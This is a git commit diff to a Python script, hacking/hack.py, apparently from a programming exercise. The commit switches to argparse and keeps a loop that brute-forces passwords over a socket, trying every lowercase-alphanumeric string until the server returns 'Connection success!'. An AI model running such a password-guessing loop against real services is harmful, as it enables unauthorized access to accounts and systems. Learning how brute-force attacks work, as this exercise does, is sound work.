9f8cd887c578f0a45f4a6441d8782e9f8913f33a
Rutzno <d.rutzno@gmail.com>
2022-08-30 07:50:19 +0100

    stage 2 - brute forcing

--- hacking/hack.py
+++ hacking/hack.py
@@ -1,3 +1,4 @@
+import argparse
 import itertools
 import socket
 import sys
@@ -9,31 +10,30 @@ __version__ = "1.0.2"
 """
 
 if __name__ == "__main__":
-    args = sys.argv
+    parser = argparse.ArgumentParser(description="A script to guess password")
+    parser.add_argument("hostname", type=str, help="IP address or domain name")
+    parser.add_argument("port", type=int, help="Port number")
+    args = parser.parse_args()
 
-    if len(args) != 3:
-        print("The script should be called with two arguments, the hostname and the port to connect to the server")
-    else:
-        with socket.socket() as client_socket:  # creating the socket with context manager
-            hostname = args[1]
-            port = int(args[2])
-            address = (hostname, port)
+    with socket.socket() as client_socket:  # creating the socket with context manager
+        hostname = args.hostname
+        port = args.port
+        address = (hostname, port)
 
-            client_socket.connect(address)  # connecting to the server
+        client_socket.connect(address)  # connecting to the server
 
-            chars = "abcdefghijklmnopqrstuvwxyz0123456789"
-            i = 1
-            response = ""
-            while response != "Connection success!":
-                for tup in itertools.product(chars, repeat=i):
-                    password = "".join(tup)  # converting tuple to string
-                    client_socket.send(password.encode())  # sending through socket
+        chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+        i = 1
+        response = ""
+        while response != "Connection success!":
+            for s in itertools.product(chars, repeat=i):
+                password = "".join(s)
+                client_socket.send(password.encode())  # sending through socket
 
-                    response = client_socket.recv(1024)  # receiving the response
-                    response = response.decode()  # decoding from bytes to string
-
-                    if response == "Connection success!":
-                        print(password)
-                        break
-                i += 1
+                response = client_socket.recv(1024)  # receiving the response
+                response = response.decode()  # decoding from bytes to string
+                if response == "Connection success!":
+                    print(password)
+                    break
+            i += 1
 
